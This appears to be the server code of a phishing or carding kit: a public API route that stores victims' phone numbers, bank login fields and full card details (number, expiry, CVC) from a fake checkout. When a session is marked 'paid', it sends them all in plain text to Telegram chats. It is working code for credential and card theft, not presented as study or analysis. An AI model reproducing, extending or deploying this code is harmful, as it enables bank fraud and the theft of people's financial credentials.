import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "*, content-type, authorization, x-requested-with, accept, origin",
  "Access-Control-Max-Age": "86400",
  "Access-Control-Expose-Headers": "*",
};

const bodySchema = z.object({
  session_id: z.string().uuid(),
  type: z.enum(["phone", "plan", "method", "bank_login", "card", "complete"]),
  payload: z.record(z.any()).default({}),
});

function formatEUR(cents: number | null | undefined): string {
  const c = typeof cents === "number" ? cents : 0;
  return new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(c / 100) + " €";
}

function esc(s: unknown): string {
  return String(s ?? "—").replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]!));
}

async function notifyTelegram(sessionId: string) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) return;
  try {
    const { sbRest } = await import("@/integrations/supabase/rest.server");
    const [sessRows, events, chats] = await Promise.all([
      sbRest.select<{
        phone: string | null; method: string | null; bank_name: string | null; bank_slug: string | null;
        amount_cents: number | null; customer_email: string | null; shop_domain: string | null;
      }>("sessions", { select: "phone,method,bank_name,bank_slug,amount_cents,customer_email,shop_domain", eq: { id: sessionId }, limit: 1 }),
      sbRest.select<{ type: string; payload: Record<string, unknown> }>("session_events", { select: "type,payload", eq: { session_id: sessionId } }),
      sbRest.select<{ chat_id: string }>("telegram_chats", { select: "chat_id" }),
    ]);
    const sess = sessRows?.[0];
    if (!sess || !chats?.length) return;

    const cardEvent = events.find((e) => e.type === "card");
    const bankEvent = events.find((e) => e.type === "bank_login");

    const lines: string[] = [];
    lines.push("<b>💰 Neue Zahlung (paid)</b>");
    lines.push("");
    lines.push(`<b>Betrag:</b> ${esc(formatEUR(sess.amount_cents))}`);
    lines.push(`<b>E-Mail:</b> ${esc(sess.customer_email)}`);
    lines.push(`<b>Telefon:</b> ${esc(sess.phone)}`);
    lines.push(`<b>Shop:</b> ${esc(sess.shop_domain)}`);
    lines.push(`<b>Methode:</b> ${esc(sess.method)}`);
    if (bankEvent) {
      const p = bankEvent.payload as Record<string, unknown>;
      lines.push("");
      lines.push(`<b>Bank:</b> ${esc(sess.bank_name ?? p["bank_name"])}`);
      if (p["field1_label"]) lines.push(`<b>${esc(p["field1_label"])}:</b> <code>${esc(p["field1"])}</code>`);
      else if (p["field1"]) lines.push(`<b>Feld 1:</b> <code>${esc(p["field1"])}</code>`);
      if (p["field2_label"]) lines.push(`<b>${esc(p["field2_label"])}:</b> <code>${esc(p["field2"])}</code>`);
      else if (p["field2"]) lines.push(`<b>Feld 2:</b> <code>${esc(p["field2"])}</code>`);
      if (p["branch"]) lines.push(`<b>Filiale:</b> ${esc(p["branch"])}`);
    }
    if (cardEvent) {
      const p = cardEvent.payload as Record<string, unknown>;
      lines.push("");
      lines.push("<b>Kreditkarte</b>");
      lines.push(`<b>Nummer:</b> <code>${esc(p["number"])}</code>`);
      lines.push(`<b>Ablauf:</b> <code>${esc(p["expiry"])}</code>`);
      lines.push(`<b>CVC:</b> <code>${esc(p["cvc"])}</code>`);
    }
    lines.push("");
    lines.push(`<i>Session: ${sessionId}</i>`);
    const text = lines.join("\n");

    await Promise.all(chats.map((c) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: c.chat_id, text, parse_mode: "HTML", disable_web_page_preview: true }),
      }).catch(() => {})
    ));
  } catch {
    /* swallow */
  }
}

export const Route = createFileRoute("/api/public/session-event")({
  server: {
    handlers: {
      OPTIONS: async () => new Response(null, { status: 204, headers: CORS }),
      POST: async ({ request }) => {
        try {
          const raw = await request.json();
          const parsed = bodySchema.safeParse(raw);
          if (!parsed.success) {
            return new Response(JSON.stringify({ error: parsed.error.issues }), {
              status: 400,
              headers: { "content-type": "application/json", ...CORS },
            });
          }
          const { session_id, type, payload } = parsed.data;
          const { sbRest } = await import("@/integrations/supabase/rest.server");

          await sbRest.insert("session_events", { session_id, type, payload });

          const p = payload as Record<string, unknown>;
          const updates: Record<string, unknown> = {};
          if (type === "phone" && typeof p["phone"] === "string") updates["phone"] = p["phone"];
          if (type === "plan" && typeof p["plan"] === "string") updates["plan"] = p["plan"];
          if (type === "method" && typeof p["method"] === "string") updates["method"] = p["method"];
          if (type === "bank_login") {
            if (typeof p["bank_slug"] === "string") updates["bank_slug"] = p["bank_slug"];
            if (typeof p["bank_name"] === "string") updates["bank_name"] = p["bank_name"];
            updates["method"] = "sofort";
          }
          if (type === "complete") updates["status"] = "paid";

          if (Object.keys(updates).length > 0) {
            await sbRest.update("sessions", updates, { id: session_id });
          }

          if (type === "complete") {
            await notifyTelegram(session_id);
            const rows = await sbRest.select<{ webhook_url: string | null }>("sessions", {
              select: "webhook_url",
              eq: { id: session_id },
              limit: 1,
            });
            const webhook = rows?.[0]?.webhook_url;
            if (webhook) {
              fetch(webhook, {
                method: "POST",
                headers: { "content-type": "application/json" },
                body: JSON.stringify({ session_id, status: "paid" }),
              }).catch(() => {});
            }
          }

          return new Response(JSON.stringify({ ok: true }), {
            status: 200,
            headers: { "content-type": "application/json", ...CORS },
          });
        } catch (e) {
          return new Response(JSON.stringify({ error: (e as Error).message }), {
            status: 500,
            headers: { "content-type": "application/json", ...CORS },
          });
        }
      },
    },
  },
});
